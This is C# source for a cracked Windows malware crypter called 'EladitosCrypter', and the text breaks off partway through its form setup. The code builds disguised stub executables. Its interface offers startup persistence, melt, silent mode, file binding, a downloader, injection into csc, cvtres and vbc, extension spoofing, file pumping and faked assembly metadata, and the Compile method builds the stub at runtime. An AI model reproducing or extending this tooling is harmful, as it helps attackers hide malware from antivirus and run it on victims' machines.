namespace EladitosCrypter
{
    using EladitosCrypter.Properties;
    using Microsoft.CSharp;
    using System;
    using System.CodeDom.Compiler;
    using System.Collections.Generic;
    using System.Collections.Specialized;
    using System.ComponentModel;
    using System.Diagnostics;
    using System.Drawing;
    using System.IO;
    using System.Reflection;
    using System.Resources;
    using System.Runtime.InteropServices;
    using System.Text;
    using System.Text.RegularExpressions;
    using System.Threading;
    using System.Windows.Forms;

    public class Form1 : Form
    {
        // Fields
       
        private InstaCheckBox a1;
        private InstaCheckBox a2;
        private InstaCheckBox a3;
        private InstaCheckBox a4;
        private InstaCheckBox a5;
        private TextBox aCompany;
        private TextBox aCopyright;
        private TextBox aDescription;
        private TextBox aProduct;
        private TextBox aTitle;
        private TextBox aVersion;
        private InstaButton binderAdd;
        private InstaButton binderClear;
        private InstaButton binderRemove;
        private InstaCheckBox boolMsg;
        private InstaCheckBox boxBindOnce;
        private InstaCheckBox boxDLOnce;
        private InstaCheckBox boxPersistence;
        private InstaCheckBox boxSpoof;
        private InstaCheckBox boxStartup;
        public static bool CloneIcon = false;
        private IContainer components = null;
        private InstaProgressBar cryptingBar;
        private InstaCheckBox csc;
        private InstaCheckBox custom;
        private InstaCheckBox cvtres;
        private InstaCheckBox d1;
        private InstaCheckBox d2;
        private InstaCheckBox d3;
        private InstaCheckBox d4;
        public static bool errorb = false;
        private InstaLabel expDate;
        public static string FileLoc = string.Empty;
        private static string herem8 = string.Empty;
        public static string IconLoc = string.Empty;
        public static string inj = string.Empty;
        private InstaButton instaButton1;
        private InstaButton instaButton10;
        private InstaButton instaButton11;
        private InstaButton instaButton12;
        private InstaButton instaButton13;
        private InstaButton instaButton2;
        private InstaButton instaButton3;
        private InstaButton instaButton4;
        private InstaButton instaButton5;
        private InstaButton instaButton6;
        private InstaButton instaButton7;
        private InstaButton instaButton8;
        private InstaButton instaButton9;
        private InstaCheckBox instaCheckBox1;
        private InstaCheckBox instaCheckBox3;
        private InstaLabel instaLabel10;
        private InstaLabel instaLabel11;
        private InstaLabel instaLabel12;
        private InstaLabel instaLabel13;
        private InstaLabel instaLabel14;
        private InstaLabel instaLabel15;
        private InstaLabel instaLabel16;
        private InstaLabel instaLabel17;
        private InstaLabel instaLabel18;
        private InstaLabel instaLabel19;
        private InstaLabel instaLabel20;
        private InstaLabel instaLabel21;
        private InstaLabel instaLabel22;
        private InstaLabel instaLabel23;
        private InstaLabel instaLabel24;
        private InstaLabel instaLabel25;
        private InstaLabel instaLabel26;
        private InstaLabel instaLabel27;
        private InstaLabel instaLabel28;
        private InstaLabel instaLabel29;
        private InstaLabel instaLabel3;
        private InstaLabel instaLabel30;
        private InstaLabel instaLabel4;
        private InstaLabel instaLabel5;
        private InstaLabel instaLabel6;
        private InstaLabel instaLabel7;
        private InstaLabel instaLabel9;
        private InstaSeperator instaSeperator1;
        private InstaSeperator instaSeperator10;
        private InstaSeperator instaSeperator11;
        private InstaSeperator instaSeperator2;
        private InstaSeperator instaSeperator3;
        private InstaSeperator instaSeperator4;
        private InstaSeperator instaSeperator5;
        private InstaSeperator instaSeperator6;
        private InstaSeperator instaSeperator7;
        private InstaSeperator instaSeperator8;
        private InstaSeperator instaSeperator9;
        private InstaTabControl instaTabControl1;
        private InstaTheme instaTheme1;
        private InstaCheckBox itself;
        private InstaLabel labelExtension;
        private InstaLabel lblFile;
        private ListBox listBind;
        private ListBox listDL;
        private TextBox msgBody;
        private InstaCheckBox msgRunOnce;
        private TextBox msgTitle;
        private string n = "\r\n";
        private NumericUpDown numDelay;
        private NumericUpDown numPump;
        private PictureBox pictureBox1;
        private static Random r = new Random();   
        public static string str = "䂥䂀䂁䂀䂀䁿䁾䁽䂌䂋䂎䃞䃝䃜䃛䃫䃬䃮䃰䃱䃲䃳䃴䃵䃶䃷䃸䃹䃺䃪䃩䃙䄣䄢䄡䄠䄟䒐䒏䒎䒍䒌䒋䑬䑽䑼䑾䒀䒂䑳䄞䄝䄜䄛䄋䃻䃫䃬䃭䃮䃯䃰䃱䃲䃳䃴䃵䃶䃷䃸䃹䃺䆴䇀䇁䆱䇟䇮䇯䇱䇝䇜䇍䉶䉱䉲䉢䉣䊃䊅䊖䊦䊥䊐䊞䊟䌵䌴䌳䍦䍥䍷䍷䍹";
        private TabPage tabPage1;
        private TabPage tabPage2;
        private TabPage tabPage3;
        private TabPage tabPage4;
        private TabPage tabPage5;
        private TabPage tabPage6;
        private TabPage tabPage7;
        private TextBox textBox4;
        private InstaLabel timeRem;
        private TextBox txtdl;
        private TextBox txtExtension;
        private TextBox txtInj;
        private TextBox txtSUPfile;
        private TextBox txtSUPvalue;
        private InstaLabel username;
        private InstaCheckBox vbc;
        public static  byte[] runnet = File.ReadAllBytes("RunNet");
        // Methods
        public Form1()
        {
            this.InitializeComponent();
            {
            }         
            this.tabPage1.BackColor = Color.FromArgb(40, 40, 40);
            this.tabPage2.BackColor = Color.FromArgb(40, 40, 40);
            this.tabPage3.BackColor = Color.FromArgb(40, 40, 40);
            this.tabPage4.BackColor = Color.FromArgb(40, 40, 40);
            this.tabPage5.BackColor = Color.FromArgb(40, 40, 40);
            this.tabPage6.BackColor = Color.FromArgb(40, 40, 40);
            this.tabPage7.BackColor = Color.FromArgb(40, 40, 40);
        }

        private void binderAdd_Click(object sender, EventArgs e)
        {
            OpenFileDialog dialog = new OpenFileDialog {
                Filter = "All Files|*.*",
                ShowHelp = true
            };
            if (dialog.ShowDialog() == DialogResult.OK)
            {
                this.listBind.Items.Add(dialog.FileName);
            }
        }

        private void binderClear_Click(object sender, EventArgs e)
        {
            this.listBind.Items.Clear();
        }

        private void binderRemove_Click(object sender, EventArgs e)
        {
            this.listBind.Items.Remove(this.listBind.SelectedItem);
        }

        private static void Compile(string source, string resname, string filename, bool icon)
        {
            Dictionary<string, string> providerOptions = new Dictionary<string, string>();
            providerOptions.Add("CompilerVersion", "v2.0");
            CompilerParameters options = new CompilerParameters();
            options.ReferencedAssemblies.Add("System.dll");
            options.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            options.ReferencedAssemblies.Add("System.Management.dll");
            options.ReferencedAssemblies.Add("System.Drawing.dll");
            options.OutputAssembly = filename;
            options.CompilerOptions = "/filealign:0x00000200 /unsafe /optimize+ /platform:X86 /debug- /target:winexe";
            options.GenerateExecutable = true;
            options.WarningLevel = 0;
            options.TreatWarningsAsErrors = false;
            options.EmbeddedResources.Add(Application.StartupPath + @"\" + resname + ".resources");
            errorb = false;
            CompilerResults results = new CSharpCodeProvider(providerOptions).CompileAssemblyFromSource(options, new string[] { source });
            if (results.Errors.Count > 0)
            {
                foreach (CompilerError error in results.Errors)
                {
                    MessageBox.Show(error.ToString());
                }
                errorb = true;
            }
            File.Delete(Application.StartupPath + @"\" + resname + ".resources");
        }

        private void csc_Click(object sender, EventArgs e)
        {
            this.vbc.Checked = false;
            this.vbc.Refresh();
            this.custom.Checked = false;
            this.custom.Refresh();
            this.cvtres.Checked = false;
            this.cvtres.Refresh();
            this.itself.Checked = false;
            this.itself.Refresh();
            inj = "csc";
        }

        private void custom_Click(object sender, EventArgs e)
        {
            this.vbc.Checked = false;
            this.vbc.Refresh();
            this.csc.Checked = false;
            this.csc.Refresh();
            this.cvtres.Checked = false;
            this.cvtres.Refresh();
            this.itself.Checked = false;
            this.itself.Refresh();
        }

        private void cvtres_Click(object sender, EventArgs e)
        {
            this.vbc.Checked = false;
            this.vbc.Refresh();
            this.csc.Checked = false;
            this.csc.Refresh();
            this.custom.Checked = false;
            this.custom.Refresh();
            this.itself.Checked = false;
            this.itself.Refresh();
            inj = "cvtres";
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && (this.components != null))
            {
                this.components.Dispose();
            }
            base.Dispose(disposing);
        }

        private string encstring(string input)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(input));
        }

        private void Form1_Load(object sender, EventArgs e)
        {
        }

        private void Form1_Load_1(object sender, EventArgs e)
        {
        }

        public void increase(float value)
        {
            this.cryptingBar.Value += value;
            this.cryptingBar.Refresh();
            Thread.Sleep(100);
        }

        private void InitializeComponent()
        {
            this.textBox4 = new System.Windows.Forms.TextBox();
            this.instaButton8 = new InstaButton();
            this.expDate = new InstaLabel();
            this.instaButton3 = new InstaButton();
            this.instaSeperator2 = new InstaSeperator();
            this.cryptingBar = new InstaProgressBar();
            this.instaButton1 = new InstaButton();
            this.timeRem = new InstaLabel();
            this.username = new InstaLabel();
            this.instaTabControl1 = new InstaTabControl();
            this.tabPage1 = new System.Windows.Forms.TabPage();
            this.instaLabel23 = new InstaLabel();
            this.instaLabel3 = new InstaLabel();
            this.boxStartup = new InstaCheckBox();
            this.instaLabel6 = new InstaLabel();
            this.instaSeperator3 = new InstaSeperator();
            this.instaCheckBox3 = new InstaCheckBox();
            this.boxPersistence = new InstaCheckBox();
            this.instaCheckBox1 = new InstaCheckBox();
            this.itself = new InstaCheckBox();
            this.cvtres = new InstaCheckBox();
            this.csc = new InstaCheckBox();
            this.custom = new InstaCheckBox();
            this.vbc = new InstaCheckBox();
            this.txtInj = new System.Windows.Forms.TextBox();
            this.txtSUPfile = new System.Windows.Forms.TextBox();
            this.txtSUPvalue = new System.Windows.Forms.TextBox();
            this.instaLabel5 = new InstaLabel();
            this.instaLabel4 = new InstaLabel();
            this.instaSeperator1 = new InstaSeperator();
            this.lblFile = new InstaLabel();
            this.instaButton2 = new InstaButton();
            this.tabPage2 = new System.Windows.Forms.TabPage();
            this.boxBindOnce = new InstaCheckBox();
            this.binderClear = new InstaButton();
            this.binderRemove = new InstaButton();
            this.binderAdd = new InstaButton();
            this.listBind = new System.Windows.Forms.ListBox();
            this.tabPage3 = new System.Windows.Forms.TabPage();
            this.instaButton4 = new InstaButton();
            this.instaButton5 = new InstaButton();
            this.instaButton6 = new InstaButton();
            this.txtdl = new System.Windows.Forms.TextBox();
            this.boxDLOnce = new InstaCheckBox();
            this.listDL = new System.Windows.Forms.ListBox();
            this.tabPage5 = new System.Windows.Forms.TabPage();
            this.a3 = new InstaCheckBox();
            this.instaLabel10 = new InstaLabel();
            this.d4 = new InstaCheckBox();
            this.d3 = new InstaCheckBox();
            this.d2 = new InstaCheckBox();
            this.d1 = new InstaCheckBox();
            this.instaLabel9 = new InstaLabel();
            this.instaSeperator5 = new InstaSeperator();
            this.a2 = new InstaCheckBox();
            this.a4 = new InstaCheckBox();
            this.a5 = new InstaCheckBox();
            this.a1 = new InstaCheckBox();
            this.instaLabel7 = new InstaLabel();
            this.instaSeperator4 = new InstaSeperator();
            this.tabPage7 = new System.Windows.Forms.TabPage();
            this.instaLabel11 = new InstaLabel();
            this.boolMsg = new InstaCheckBox();
            this.msgRunOnce = new InstaCheckBox();
            this.instaButton7 = new InstaButton();
            this.msgBody = new System.Windows.Forms.TextBox();
            this.instaLabel13 = new InstaLabel();
            this.msgTitle = new System.Windows.Forms.TextBox();
            this.instaLabel12 = new InstaLabel();
            this.instaSeperator6 = new InstaSeperator();
            this.tabPage4 = new System.Windows.Forms.TabPage();
            this.instaLabel30 = new InstaLabel();
            this.aVersion = new System.Windows.Forms.TextBox();
            this.instaLabel29 = new InstaLabel();
            this.instaLabel28 = new InstaLabel();
            this.aDescription = new System.Windows.Forms.TextBox();
            this.instaLabel27 = new InstaLabel();
            this.instaLabel26 = new InstaLabel();
            this.aTitle = new System.Windows.Forms.TextBox();
            this.instaLabel25 = new InstaLabel();
            this.instaButton13 = new InstaButton();
            this.instaButton12 = new InstaButton();
            this.aCopyright = new System.Windows.Forms.TextBox();
            this.aProduct = new System.Windows.Forms.TextBox();
            this.aCompany = new System.Windows.Forms.TextBox();
            this.instaLabel24 = new InstaLabel();
            this.instaSeperator11 = new InstaSeperator();
            this.instaButton11 = new InstaButton();
            this.instaButton10 = new InstaButton();
            this.instaButton9 = new InstaButton();
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.instaLabel15 = new InstaLabel();
            this.instaSeperator10 = new InstaSeperator();
            this.tabPage6 = new System.Windows.Forms.TabPage();
            this.instaLabel22 = new InstaLabel();
            this.instaLabel21 = new InstaLabel();
            this.instaLabel20 = new InstaLabel();
            this.numDelay = new System.Windows.Forms.NumericUpDown();
            this.instaLabel19 = new InstaLabel();
            this.instaSeperator9 = new InstaSeperator();
            this.instaLabel18 = new InstaLabel();
            this.numPump = new System.Windows.Forms.NumericUpDown();
            this.instaLabel17 = new InstaLabel();
            this.instaLabel16 = new InstaLabel();
            this.instaSeperator8 = new InstaSeperator();
            this.labelExtension = new InstaLabel();
            this.txtExtension = new System.Windows.Forms.TextBox();
            this.instaLabel14 = new InstaLabel();
            this.boxSpoof = new InstaCheckBox();
            this.instaSeperator7 = new InstaSeperator();
            this.instaTheme1 = new InstaTheme();
            this.instaTabControl1.SuspendLayout();
            this.tabPage1.SuspendLayout();
            this.tabPage2.SuspendLayout();
            this.tabPage3.SuspendLayout();
            this.tabPage5.SuspendLayout();
            this.tabPage7.SuspendLayout();
            this.tabPage4.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            this.tabPage6.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.numDelay)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.numPump)).BeginInit();
            this.SuspendLayout();
            // 
            // textBox4
            // 
            this.textBox4.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.textBox4.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.textBox4.Font = new System.Drawing.Font("Verdana", 7F);
            this.textBox4.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(160)))), ((int)(((byte)(190)))));
            this.textBox4.Location = new System.Drawing.Point(172, 35);
            this.textBox4.Multiline = true;
            this.textBox4.Name = "textBox4";
            this.textBox4.ReadOnly = true;
            this.textBox4.Size = new System.Drawing.Size(272, 63);
            this.textBox4.TabIndex = 25;
            this.textBox4.Text = "Craked By Reborn Enjoy !!!\r\nNext time protect , obfu you code bro.\r\nI can help yo" +
    "u :D\r\nSorry for you";
            // 
            // instaButton8
            // 
            this.instaButton8.Font = new System.Drawing.Font("Verdana", 7F);
            this.instaButton8.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.instaButton8.Location = new System.Drawing.Point(10, 333);
            this.instaButton8.Name = "instaButton8";
            this.instaButton8.Size = new System.Drawing.Size(152, 51);
            this.instaButton8.TabIndex = 26;
            this.instaButton8.Text = "Scanner";
            this.instaButton8.Click += new System.EventHandler(this.instaButton8_Click);
            // 
            // expDate
            // 
            this.expDate.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.expDate.Font = new System.Drawing.Font("Verdana", 7F);
            this.expDate.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(160)))), ((int)(((byte)(190)))));
            this.expDate.Location = new System.Drawing.Point(12, 80);
            this.expDate.Name = "expDate";
            this.expDate.Size = new System.Drawing.Size(146, 19);
            this.expDate.TabIndex = 24;
            this.expDate.Text = "Expiration Date: Never Ever.";
            // 
            // instaButton3
            // 
            this.instaButton3.Font = new System.Drawing.Font("Verdana", 7F);
            this.instaButton3.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.instaButton3.Location = new System.Drawing.Point(436, 2);
            this.instaButton3.Name = "instaButton3";
            this.instaButton3.Size = new System.Drawing.Size(18, 16);
            this.instaButton3.TabIndex = 22;
            this.instaButton3.Text = "X";
            this.instaButton3.Click += new System.EventHandler(this.instaButton3_Click);
            // 
            // instaSeperator2
            // 
            this.instaSeperator2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.instaSeperator2.IsVertical = true;
            this.instaSeperator2.Location = new System.Drawing.Point(164, 35);
            this.instaSeperator2.Name = "instaSeperator2";
            this.instaSeperator2.Size = new System.Drawing.Size(17, 63);
            this.instaSeperator2.TabIndex = 6;
            this.instaSeperator2.Text = "instaSeperator2";
            this.instaSeperator2.Thickness = 1F;
            // 
            // cryptingBar
            // 
            this.cryptingBar.Font = new System.Drawing.Font("Verdana", 7F);
            this.cryptingBar.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.cryptingBar.Location = new System.Drawing.Point(166, 365);
            this.cryptingBar.Name = "cryptingBar";
            this.cryptingBar.ShowPercentage = true;
            this.cryptingBar.Size = new System.Drawing.Size(284, 19);
            this.cryptingBar.TabIndex = 5;
            this.cryptingBar.Text = "instaProgressBar1";
            this.cryptingBar.Value = 0F;
            // 
            // instaButton1
            // 
            this.instaButton1.Font = new System.Drawing.Font("Verdana", 7F);
            this.instaButton1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.instaButton1.Location = new System.Drawing.Point(166, 333);
            this.instaButton1.Name = "instaButton1";
            this.instaButton1.Size = new System.Drawing.Size(284, 25);
            this.instaButton1.TabIndex = 4;
            this.instaButton1.Text = "Encrypt";
            this.instaButton1.Click += new System.EventHandler(this.instaButton1_Click);
            // 
            // timeRem
            // 
            this.timeRem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.timeRem.Font = new System.Drawing.Font("Verdana", 7F);
            this.timeRem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(160)))), ((int)(((byte)(190)))));
            this.timeRem.Location = new System.Drawing.Point(12, 57);
            this.timeRem.Name = "timeRem";
            this.timeRem.Size = new System.Drawing.Size(146, 19);
            this.timeRem.TabIndex = 3;
            this.timeRem.Text = "Time Remaining: ∞";
            // 
            // username
            // 
            this.username.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.username.Font = new System.Drawing.Font("Verdana", 7F);
            this.username.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(160)))), ((int)(((byte)(190)))));
            this.username.Location = new System.Drawing.Point(12, 35);
            this.username.Name = "username";
            this.username.Size = new System.Drawing.Size(146, 19);
            this.username.TabIndex = 2;
            this.username.Text = "Username: Reborn";
            // 
            // instaTabControl1
            // 
            this.instaTabControl1.Alignment = System.Windows.Forms.TabAlignment.Left;
            this.instaTabControl1.Controls.Add(this.tabPage1);
            this.instaTabControl1.Controls.Add(this.tabPage2);
            this.instaTabControl1.Controls.Add(this.tabPage3);
            this.instaTabControl1.Controls.Add(this.tabPage5);
            this.instaTabControl1.Controls.Add(this.tabPage7);
            this.instaTabControl1.Controls.Add(this.tabPage4);
            this.instaTabControl1.Controls.Add(this.tabPage6);
            this.instaTabControl1.Font = new System.Drawing.Font("Verdana", 7F);
            this.instaTabControl1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.instaTabControl1.ItemSize = new System.Drawing.Size(30, 152);
            this.instaTabControl1.Location = new System.Drawing.Point(10, 104);
            this.instaTabControl1.Multiline = true;
            this.instaTabControl1.Name = "instaTabControl1";
            this.instaTabControl1.SelectedIndex = 0;
            this.instaTabControl1.Size = new System.Drawing.Size(444, 223);
            this.instaTabControl1.SizeMode = System.Windows.Forms.TabSizeMode.Fixed;
            this.instaTabControl1.TabIndex = 1;
            // 
            // tabPage1
            // 
            this.tabPage1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(212)))), ((int)(((byte)(212)))), ((int)(((byte)(212)))));
            this.tabPage1.Controls.Add(this.instaLabel23);
            this.tabPage1.Controls.Add(this.instaLabel3);
            this.tabPage1.Controls.Add(this.boxStartup);
            this.tabPage1.Controls.Add(this.instaLabel6);
            this.tabPage1.Controls.Add(this.instaSeperator3);
            this.tabPage1.Controls.Add(this.instaCheckBox3);
            this.tabPage1.Controls.Add(this.boxPersistence);
            this.tabPage1.Controls.Add(this.instaCheckBox1);
            this.tabPage1.Controls.Add(this.itself);
            this.tabPage1.Controls.Add(this.cvtres);
            this.tabPage1.Controls.Add(this.csc);
            this.tabPage1.Controls.Add(this.custom);
            this.tabPage1.Controls.Add(this.vbc);
            this.tabPage1.Controls.Add(this.txtInj);
            this.tabPage1.Controls.Add(this.txtSUPfile);
            this.tabPage1.Controls.Add(this.txtSUPvalue);
            this.tabPage1.Controls.Add(this.instaLabel5);
            this.tabPage1.Controls.Add(this.instaLabel4);
            this.tabPage1.Controls.Add(this.instaSeperator1);
            this.tabPage1.Controls.Add(this.lblFile);
            this.tabPage1.Controls.Add(this.instaButton2);
            this.tabPage1.Location = new System.Drawing.Point(156, 4);
            this.tabPage1.Name = "tabPage1";
            this.tabPage1.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage1.Size = new System.Drawing.Size(284, 215);
            this.tabPage1.TabIndex = 0;
            this.tabPage1.Text = "Main";
            // 
            // instaLabel23
            // 
            this.instaLabel23.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.instaLabel23.Font = new System.Drawing.Font("Verdana", 6F);
            this.instaLabel23.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(160)))), ((int)(((byte)(190)))));
            this.instaLabel23.Location = new System.Drawing.Point(56, 202);
            this.instaLabel23.Name = "instaLabel23";
            this.instaLabel23.Size = new System.Drawing.Size(226, 11);
            this.instaLabel23.TabIndex = 26;
            this.instaLabel23.Text = "If \"itself\" is automatically set, please do not change it.";
            // 
            // instaLabel3
            // 
            this.instaLabel3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.instaLabel3.Font = new System.Drawing.Font("Verdana", 7F);
            this.instaLabel3.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(160)))), ((int)(((byte)(190)))));
            this.instaLabel3.Location = new System.Drawing.Point(24, 41);
            this.instaLabel3.Name = "instaLabel3";
            this.instaLabel3.Size = new System.Drawing.Size(134, 19);
            this.instaLabel3.TabIndex = 8;
            this.instaLabel3.Text = "Startup";
            // 
            // boxStartup
            // 
            this.boxStartup.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.boxStartup.Checked = false;
            this.boxStartup.CheckStyle = InstaCheckBox.CheckStyleType.Square;
            this.boxStartup.Font = new System.Drawing.Font("Verdana", 7F);
            this.boxStartup.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.boxStartup.Location = new System.Drawing.Point(9, 41);
            this.boxStartup.Name = "boxStartup";
            this.boxStartup.Size = new System.Drawing.Size(18, 15);
            this.boxStartup.TabIndex = 25;
            // 
            // instaLabel6
            // 
            this.instaLabel6.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.instaLabel6.Font = new System.Drawing.Font("Verdana", 7F);
            this.instaLabel6.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(160)))), ((int)(((byte)(190)))));
            this.instaLabel6.Location = new System.Drawing.Point(6, 121);
            this.instaLabel6.Name = "instaLabel6";
            this.instaLabel6.Size = new System.Drawing.Size(134, 19);
            this.instaLabel6.TabIndex = 14;
            this.instaLabel6.Text = "Inject";
            // 
            // instaSeperator3
            // 
            this.instaSeperator3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.instaSeperator3.IsVertical = false;
            this.instaSeperator3.Location = new System.Drawing.Point(6, 117);
            this.instaSeperator3.Name = "instaSeperator3";
            this.instaSeperator3.Size = new System.Drawing.Size(272, 23);
            this.instaSeperator3.TabIndex = 13;
            this.instaSeperator3.Text = "instaSeperator3";
            this.instaSeperator3.Thickness = 1F;
            // 
            // instaCheckBox3
            // 
            this.instaCheckBox3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.instaCheckBox3.Checked = false;
            this.instaCheckBox3.CheckStyle = InstaCheckBox.CheckStyleType.Square;
            this.instaCheckBox3.Font = new System.Drawing.Font("Verdana", 7F);
            this.instaCheckBox3.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.instaCheckBox3.Location = new System.Drawing.Point(205, 99);
            this.instaCheckBox3.Name = "instaCheckBox3";
            this.instaCheckBox3.Size = new System.Drawing.Size(78, 23);
            this.instaCheckBox3.TabIndex = 24;
            this.instaCheckBox3.Text = "Melt";
            // 
            // boxPersistence
            // 
            this.boxPersistence.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.boxPersistence.Checked = false;
            this.boxPersistence.CheckStyle = InstaCheckBox.CheckStyleType.Square;
            this.boxPersistence.Font = new System.Drawing.Font("Verdana", 7F);
            this.boxPersistence.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.boxPersistence.Location = new System.Drawing.Point(205, 80);
            this.boxPersistence.Name = "boxPersistence";
            this.boxPersistence.Size = new System.Drawing.Size(78, 23);
            this.boxPersistence.TabIndex = 23;
            this.boxPersistence.Text = "Persistence";
            this.boxPersistence.Click += new System.EventHandler(this.boxPersistence_Click);
            // 
            // instaCheckBox1
            // 
            this.instaCheckBox1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.instaCheckBox1.Checked = true;
            this.instaCheckBox1.CheckStyle = InstaCheckBox.CheckStyleType.Square;
            this.instaCheckBox1.Font = new System.Drawing.Font("Verdana", 7F);
            this.instaCheckBox1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.instaCheckBox1.Location = new System.Drawing.Point(205, 61);
            this.instaCheckBox1.Name = "instaCheckBox1";
            this.instaCheckBox1.Size = new System.Drawing.Size(65, 23);
            this.instaCheckBox1.TabIndex = 22;
            this.instaCheckBox1.Text = "Silent";
            // 
            // itself
            // 
            this.itself.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.itself.Checked = false;
            this.itself.CheckStyle = InstaCheckBox.CheckStyleType.Round;
            this.itself.Font = new System.Drawing.Font("Verdana", 7F);
            this.itself.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.itself.Location = new System.Drawing.Point(202, 179);
            this.itself.Name = "itself";
            this.itself.Size = new System.Drawing.Size(48, 23);
            this.itself.TabIndex = 21;
            this.itself.Text = "itself";
            this.itself.Click += new System.EventHandler(this.itself_Click);
            // 
            // cvtres
            // 
            this.cvtres.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.cvtres.Checked = false;
            this.cvtres.CheckStyle = InstaCheckBox.CheckStyleType.Round;
            this.cvtres.Font = new System.Drawing.Font("Verdana", 7F);
            this.cvtres.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.cvtres.Location = new System.Drawing.Point(122, 179);
            this.cvtres.Name = "cvtres";
            this.cvtres.Size = new System.Drawing.Size(48, 23);
            this.cvtres.TabIndex = 20;
            this.cvtres.Text = "cvtres";
            this.cvtres.Click += new System.EventHandler(this.cvtres_Click);
            // 
            // csc
            // 
            this.csc.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.csc.Checked = false;
            this.csc.CheckStyle = InstaCheckBox.CheckStyleType.Round;
            this.csc.Font = new System.Drawing.Font("Verdana", 7F);
            this.csc.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.csc.Location = new System.Drawing.Point(24, 179);
            this.csc.Name = "csc";
            this.csc.Size = new System.Drawing.Size(48, 23);
            this.csc.TabIndex = 19;
            this.csc.Text = "csc";
            this.csc.Click += new System.EventHandler(this.csc_Click);
            // 
            // custom
            // 
            this.custom.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.custom.Checked = true;
            this.custom.CheckStyle = InstaCheckBox.CheckStyleType.Round;
            this.custom.Font = new System.Drawing.Font("Verdana", 7F);
            this.custom.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.custom.Location = new System.Drawing.Point(24, 147);
            this.custom.Name = "custom";
            this.custom.Size = new System.Drawing.Size(62, 23);
            this.custom.TabIndex = 18;
            this.custom.Text = "Custom";
            this.custom.Click += new System.EventHandler(this.custom_Click);
            // 
            // vbc
            // 
